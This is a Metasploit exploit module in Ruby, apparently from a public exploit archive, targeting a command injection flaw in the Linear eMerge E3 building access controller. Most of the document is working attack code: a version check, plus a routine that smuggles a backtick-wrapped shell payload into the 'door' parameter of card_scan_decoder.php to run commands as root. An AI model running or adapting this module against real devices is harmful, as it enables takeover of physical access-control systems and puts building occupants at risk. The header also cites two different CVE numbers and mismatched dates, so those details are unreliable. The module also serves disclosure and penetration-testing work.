# Exploit Title: eMerge E3 Access Controller 4.6.07 - Remote Code Execution (Metasploit)
# Google Dork: NA
# Date: 2018-11-11
# Exploit Author: LiquidWorm
# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
# Software Link: http://linear-solutions.com/nsc_family/e3-series/
# Version: 4.6.07
# Tested on: NA
# CVE : CVE-2019-7265
# Advisory: https://applied-risk.com/resources/ar-2019-009
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
# Advisory: https://applied-risk.com/resources/ar-2019-005
# Tested on: GNU/Linux 3.14.54 (ARMv7 rev 10), Lighttpd 1.4.40, PHP/5.6.23
#

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
        'Name'           => 'Linear eMerge E3 Access Controller Command Injection',
        'Description'    => %q{
          This module exploits a command injection vulnerability in the Linear eMerge
          E3 Access Controller. The issue is triggered by an unsanitized exec() PHP
          function allowing arbitrary command execution with root privileges.
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'Gjoko Krstic <gjoko@applied-risk.com> ' # Discovery, Exploit, MSF Module
          ],
        'References'     =>
          [
            [ 'URL', 'https://applied-risk.com/labs/advisories' ],
            [ 'URL', 'https://www.nortekcontrol.com' ],
            [ 'CVE', '2019-7256']
          ],
        'Privileged'     => false,
        'Payload'        =>
          {
            'DisableNops' => true,
          },
        'Platform'       => [ 'unix' ],
        'Arch'           => ARCH_CMD,
        'Targets'        => [ ['Linear eMerge E3', { }], ],
        'DisclosureDate' => "Oct 29 2019",
        'DefaultTarget'  => 0
      )
    )
  end

  def check
    res = send_request_cgi({
      'uri'        => normalize_uri(target_uri.path.to_s, "card_scan_decoder.php"),
      'vars_get'   =>
        {
         'No'      => '251',
         'door'    => '1337'
        }
    })
    if res.code == 200 and res.to_s =~ /PHP\/5.6.23/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def http_send_command(cmd)
    uri = normalize_uri(target_uri.path.to_s, "card_scan_decoder.php")
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => uri,
      'vars_get' =>
        {
          'No'   => '251',
          'door' => "`"+cmd+"`"
        }
    })
    unless res
      fail_with(Failure::Unknown, 'Exploit failed!')
    end
    res
  end

  def exploit
    http_send_command(payload.encoded)
    print_status("Sending #{payload.encoded.length} byte payload...")
  end
end